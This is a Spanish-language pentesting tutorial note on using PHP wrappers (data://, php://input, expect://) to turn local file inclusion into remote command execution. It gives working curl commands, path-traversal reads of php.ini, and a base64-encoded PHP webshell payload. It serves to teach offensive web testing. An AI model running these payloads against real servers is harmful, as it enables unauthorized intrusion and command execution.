# PHP Wrappers

En esta sección aprendemos cómo utilizar vulnerabilidades de inclusión de archivos (LFI) para lograr la ejecución remota de comandos (RCE) en servidores back-end de aplicaciones PHP mediante el uso de wrappers.

A diferencia de la enumeración de archivos de configuración o claves SSH privadas (ej. `id_rsa`), los wrappers permiten ejecutar comandos directamente sin depender de privilegios de lectura avanzados en otros directorios del sistema.

---

## 1. Wrapper `data://`

Permite inyectar datos externos directamente en el flujo de ejecución de PHP. Solo funciona si la configuración `allow_url_include` está activada (`On`).

### Verificación previa (`php.ini`)
Podemos comprobar si `allow_url_include` está habilitado leyendo la configuración de PHP mediante LFI con filtros de codificación base64 para evitar que se rompa la salida:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decodificamos el resultado y buscamos la directiva:
```bash
echo 'W1BIUF0...' | base64 -d | grep allow_url_include
# Salida esperada: allow_url_include = On
```

### Explotación (RCE)
1. Codificamos una webshell simple en Base64:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' | base64
   # Genera: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
   ```
2. Realizamos la solicitud URL-encodeando los caracteres especiales de la cadena Base64 y usando el wrapper `data://text/plain;base64,`:
   ```bash
   curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
   ```

---

## 2. Wrapper `php://input`

Similar a `data://`, pero el payload de ejecución se pasa a través de una petición de tipo **POST**. También requiere que `allow_url_include = On` esté configurado en el servidor back-end.

### Explotación (RCE)
Enviamos una petición POST donde el parámetro vulnerable apunta a `php://input`, y el cuerpo (POST data) contiene el código PHP a ejecutar:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

> [!NOTE]
> Para pasar el comando mediante un parámetro GET (`cmd`), el script vulnerable de la aplicación web debe usar `$_REQUEST` o permitir parámetros de ambos métodos simultáneamente. Si solo acepta POST, podemos escribir el comando estático directamente en el código enviado (ej. `<?php system('id'); ?>`).

---

## 3. Wrapper `expect://`

Diseñado específicamente para ejecutar comandos del sistema directamente a través de flujos de URL (URL streams). No requiere de una webshell intermedia.

### Verificación previa
`expect` es una extensión externa y debe estar instalada y habilitada manualmente en la configuración de PHP:
```bash
echo 'W1BIUF0...' | base64 -d | grep expect
# Salida esperada: extension=expect
```

### Explotación (RCE)
Enviamos directamente el comando que deseamos ejecutar:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
